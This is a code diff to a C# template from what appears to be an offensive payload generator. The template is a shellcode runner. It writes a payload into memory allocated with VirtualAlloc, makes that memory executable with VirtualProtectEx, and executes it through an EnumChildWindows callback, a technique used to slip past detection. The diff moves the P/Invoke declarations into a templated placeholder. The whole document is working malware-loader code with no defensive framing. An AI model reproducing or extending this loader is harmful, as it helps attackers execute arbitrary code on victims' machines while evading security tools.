@@ -111,18 +111,11 @@ namespace {{NAMESPACE}}
             IntPtr hAlloc = VirtualAlloc(IntPtr.Zero, (uint)payload.Length, 0x1000 | 0x2000, 0x04);//0x04 = RW
             Marshal.Copy(payload, 0, hAlloc, payload.Length);
             uint oldProtect;
-            VirtualProtectEx(Process.GetCurrentProcess().Handle, hAlloc, (UIntPtr)payload.Length, 0x20, out oldProtect); //0x20 = RX
+            VirtualProtectEx(Process.GetCurrentProcess().Handle, hAlloc, payload.Length, 0x20, out oldProtect); //0x20 = RX
             EnumChildWindows(IntPtr.Zero, hAlloc, IntPtr.Zero);
         }
         {{ARGS}}
-        [DllImport(""kernel32"")]
-        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
-        [DllImport(""kernel32.dll"")]
-        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
-
-        [DllImport(""user32.dll"")]
-        [return: MarshalAs(UnmanagedType.Bool)]
-        public static extern bool EnumChildWindows(IntPtr window, IntPtr callback, IntPtr i);
+        {{PINVOKE}}
     }
 }";
     }
